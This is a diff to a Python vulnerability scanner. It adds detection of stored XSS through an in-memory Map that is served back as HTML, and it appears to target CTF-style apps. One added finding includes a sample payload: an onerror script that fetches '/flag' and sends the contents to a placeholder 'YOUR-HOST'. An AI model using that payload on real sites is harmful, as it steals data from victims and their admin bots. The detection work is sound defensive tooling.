@@ -33,6 +33,7 @@ from .forin_prefix_pollution_guard import find_forin_prefix_pollution, FORIN_PRE
 from .xff_trust_guard import find_xff_trust, XFF_LANGUAGES
 from .token_mass_assign_guard import find_token_mass_assign, TOKEN_MASS_ASSIGN_LANGUAGES
 from .aead_decipher_guard import find_aead_decipher_issues, AEAD_LANGUAGES
+from .store_html_xss_guard import find_store_html_xss, STORE_XSS_LANGUAGES
 
 # No hand-written vulnerable application code is ever a single line this long —
 # only minified/bundled vendor files (tailwindcss.js, jquery.min.js, etc.) are,
@@ -652,6 +653,30 @@ def scan_lines(path: str, language: str, lines: List[str], patterns: list) -> Li
                 severity=severity,
                 why=why,
                 payload=payload,
+                confidence="likely",
+            ))
+
+    # Stored XSS through an in-memory Map: request data .set() into a
+    # store, later .get() into a .send() with an HTML content type. See
+    # store_html_xss_guard.py's module docstring.
+    if language in STORE_XSS_LANGUAGES:
+        for sf in find_store_html_xss(path, language, lines):
+            key = (sf.line_no, "Cross-Site Scripting (XSS)")
+            if key in seen:
+                continue
+            seen.add(key)
+            findings.append(Finding(
+                file=sf.file,
+                line_no=sf.line_no,
+                line_text=sf.line_text,
+                vuln_name="Cross-Site Scripting (XSS)",
+                severity="high",
+                why="This response is sent as HTML and contains a value read back from an in-memory store "
+                    "that another route in this file fills with request data (.set(key, <request value>)). "
+                    "Whatever a user stored is served raw as markup — stored XSS, typically against an admin "
+                    "bot that views it.",
+                payload="Store <img src=x onerror=fetch('/flag').then(r=>r.text()).then(t=>location='//YOUR-HOST/?'+t)>"
+                        " through the route that calls .set(), then have the victim/bot open the view route.",
                 confidence="likely",
             ))
 
